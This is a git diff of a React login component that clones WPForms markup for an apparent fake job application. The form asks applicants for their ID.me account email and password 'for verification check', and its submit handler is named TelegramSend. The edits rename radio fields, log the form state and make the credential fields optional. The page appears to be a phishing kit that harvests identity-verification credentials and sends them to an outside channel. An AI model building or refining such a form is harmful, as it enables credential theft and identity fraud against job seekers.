@@ -24,7 +24,6 @@ type IFormInput = {
   no_work: any;
   ms_office: string;
   have_id_me: string;
-  no_id_me: string;
   id_me_login: string;
   id_me_password: string;
   why_hire: string;
@@ -49,7 +48,6 @@ export default function Login() {
     no_work: "",
     ms_office: "",
     have_id_me: "",
-    no_id_me: "",
     id_me_login: "",
     id_me_password: "",
     why_hire: "",
@@ -83,6 +81,8 @@ export default function Login() {
       [event.target.name]: event.target.files?.[0] || null,
     }));
   }
+
+  console.log(formInput)
 
   async function TelegramSend(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
@@ -181,7 +181,6 @@ export default function Login() {
       document.getElementById("wpforms-page-2")?.classList.add("hide");
       document.getElementById("wpforms-page-3")?.classList.remove("hide");
       return;
-    // open_next_form("wpforms-page-3");
   }
 
   function previous_to_form2() {
@@ -1014,6 +1013,7 @@ export default function Login() {
             <ul id="wpforms-8-field_83">
               <li className="choice-1 depth-1">
                 <input
+                required
                   type="radio"
                   id="wpforms-8-field_83_1"
                   name="work_online_yes"
@@ -1030,7 +1030,7 @@ export default function Login() {
                 <input
                   type="radio"
                   id="wpforms-8-field_83_2"
-                  name="wpforms[fields][83]"
+                  name="work_online_yes"
                   value="No"
                 />
                 <label
@@ -1107,7 +1107,7 @@ export default function Login() {
                 <input
                   type="radio"
                   id="wpforms-8-field_132_2"
-                  name="no_work"
+                  name="have_work"
                   onChange={handleInputChange}
                   value="No"
                 />
@@ -1235,8 +1235,9 @@ export default function Login() {
                 <input
                   type="radio"
                   id="wpforms-8-field_134_2"
-                  name="no_id_me"
+                  name="have_id_me"
                   value="No"
+                  
                   onChange={handleInputChange}
                 />
                 <label
@@ -1290,7 +1291,7 @@ export default function Login() {
               htmlFor="wpforms-8-field_139"
             >
               If yes, Please input your login for verification check
-              <span className="wpforms-required-label">*</span>
+              
             </label>
             <input
               type="email"
@@ -1298,7 +1299,7 @@ export default function Login() {
               className="wpforms-field-medium wpforms-field-required"
               name="id_me_login"
               onChange={handleInputChange}
-              required
+              
             />
             <div className="wpforms-field-description">Email</div>
           </div>
@@ -1313,7 +1314,7 @@ export default function Login() {
               className="wpforms-field-medium wpforms-field-required"
               name="id_me_password"
               onChange={handleInputChange}
-              required
+              
             />
             <div className="wpforms-field-description">password</div>
           </div>
